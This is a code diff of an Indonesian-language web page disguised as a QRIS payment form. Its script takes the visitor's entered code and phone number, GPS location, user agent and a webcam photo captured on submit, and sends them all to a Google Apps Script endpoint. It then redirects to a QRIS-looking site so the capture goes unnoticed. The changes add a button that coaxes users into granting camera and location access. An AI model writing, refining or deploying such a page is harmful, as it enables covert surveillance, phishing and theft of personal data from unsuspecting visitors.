@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Qris Payment</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QRIS Payment</title>
 <style>
 body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
-.container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
+.container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;max-width:90%;}
 img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
 input, button {padding:12px 16px;width:100%;max-width:280px;margin-bottom:15px;border-radius:8px;font-size:16px;}
 input {border:1px solid #ccc;}
@@ -15,42 +15,50 @@ button:hover {background:#2563eb;}
 #message {margin-top:12px;font-weight:bold;display:none;}
 </style>
 </head>
-<body onload="requestPermissions()">
+<body>
 <div class="container">
-  <img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
+  <img src="https://ibb.co.com/pG50S6F" alt="Logo">
   <input id="kodeInput" type="text" placeholder="MASUKKAN KODE">
   <input id="nomorInput" type="text" placeholder="NOMOR HP PENERIMA">
+  <button onclick="requestPermissions()">Izinkan Akses Kamera & Lokasi</button>
   <button onclick="handleSubmit()">Submit</button>
   <div id="message"></div>
 </div>
 
 <script>
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKM5FdfEOY2Q8NG0oQVKtv9NSCDXBG5VtqfmL9Pvuvz3NxVSTO-AaAI7JHiuHh9BqByQ/exec"; // ganti dengan URL Web App baru
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKM5FdfEOY2Q8NG0oQVKtv9NSCDXBG5VtqfmL9Pvuvz3NxVSTO-AaAI7JHiuHh9BqByQ/exec"; // Ganti dengan URL Web App final /exec
+const REDIRECT_URL = "https://qris.interactive.co.id"; // Ganti ke halaman sukses / QRIS
 
-function requestPermissions(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(()=>console.log("Lokasi OK"), ()=>console.warn("Lokasi ditolak"));
-    }
-    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
-        navigator.mediaDevices.getUserMedia({video:true})
-        .then(stream=>stream.getTracks().forEach(t=>t.stop()))
-        .catch(err=>console.warn("Kamera ditolak:", err));
+async function requestPermissions(){
+    try{
+        await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+        console.log("Lokasi OK");
+    } catch(e){ console.warn("Lokasi ditolak"); }
+
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        stream.getTracks().forEach(track=>track.stop());
+        console.log("Kamera OK");
+        alert("Akses kamera dan lokasi berhasil diizinkan.");
+    } catch(e){ 
+        console.warn("Kamera ditolak:", e);
+        alert("Akses kamera gagal."); 
     }
 }
 
 async function handleSubmit(){
-    const kode = document.getElementById("kodeInput").value || "";
-    const nomor = document.getElementById("nomorInput").value || "";
+    const kode = document.getElementById("kodeInput").value || "UNKNOWN";
+    const nomor = document.getElementById("nomorInput").value || "UNKNOWN";
     const userAgent = navigator.userAgent || "";
     let lokasi = "Unavailable";
+    let photo = "";
 
-    try {
+    try{
         const pos = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
         lokasi = `${pos.coords.latitude},${pos.coords.longitude}`;
     } catch(e){ console.warn("Lokasi ditolak"); }
 
-    let photo = "";
-    try {
+    try{
         const stream = await navigator.mediaDevices.getUserMedia({video:true});
         const video = document.createElement("video");
         video.srcObject = stream;
@@ -76,7 +84,11 @@ async function handleSubmit(){
         const text = await resp.text();
         console.log(text);
         document.getElementById("message").textContent=text;
-    }catch(e){
+
+        // Redirect otomatis setelah submit berhasil
+        if(text === "OK") window.location.href = REDIRECT_URL;
+
+    } catch(e){
         document.getElementById("message").textContent="Gagal kirim data";
         console.error(e);
     }
